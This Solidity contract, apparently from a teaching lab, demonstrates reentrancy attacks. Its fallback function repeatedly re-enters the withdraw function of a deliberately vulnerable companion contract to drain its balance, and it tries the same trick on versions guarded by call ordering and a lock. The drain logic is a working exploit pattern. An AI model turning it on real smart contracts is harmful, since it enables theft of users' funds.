// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import { ReentrantVulnerable } from "./ReentrantVulnerable.sol";
import { ReentrantInvulnerable } from "./ReentrantInvulnerable.sol";

error Attacker__NotOwner();
error Attacker__WithdrawFailed();

contract Attacker {

    ReentrantVulnerable private s_reentrantVulnerable;
    ReentrantInvulnerable private s_reentrantInvulnerable;
    bool private s_isVulnerableAttack;
    bool private s_isInvulnerableAttackLock;
    bool private s_isInvulnerableAttack;
    address private immutable I_OWNER;

    modifier onlyOwner {
        if(msg.sender != I_OWNER) revert Attacker__NotOwner();
        _;
    }

    constructor(address _reentrantVulnerable, address _reentrantInvulnerable) {
        I_OWNER = msg.sender;
        s_reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerable);
        s_reentrantInvulnerable = ReentrantInvulnerable(_reentrantInvulnerable);
    }

    function attackVulnerable() external payable {
        s_isVulnerableAttack = true;
        s_reentrantVulnerable.deposit{ value: msg.value }();
        s_reentrantVulnerable.withdraw();
        s_isVulnerableAttack = false;
    }

    function attackInvulnerable() external payable {
        s_isInvulnerableAttack = true;
        s_reentrantInvulnerable.deposit{ value: msg.value }();
        s_reentrantInvulnerable.withdrawWithCallAtTheEnd();
        s_isInvulnerableAttack = false;
    }

    function attackInvulnerableLock() external payable {
        s_isInvulnerableAttackLock = true;
        s_reentrantInvulnerable.deposit{ value: msg.value }();
        s_reentrantInvulnerable.withdrawWithLock();
        s_isInvulnerableAttackLock = false;
    }

    function withdraw() external onlyOwner {
        (bool withdrawSuccess,) = payable(msg.sender).call{value: address(this).balance}("");
        if(!withdrawSuccess) revert Attacker__WithdrawFailed();
    }

    fallback() external payable {
        if (s_isVulnerableAttack && address(s_reentrantVulnerable).balance > 0) {
            s_reentrantVulnerable.withdraw();
        } else if (s_isInvulnerableAttack && address(s_reentrantInvulnerable).balance > 0) {
            s_reentrantInvulnerable.withdrawWithCallAtTheEnd();
        } else if (s_isInvulnerableAttackLock && address(s_reentrantInvulnerable).balance > 0) {
            s_reentrantInvulnerable.withdrawWithLock();
        }
    }

}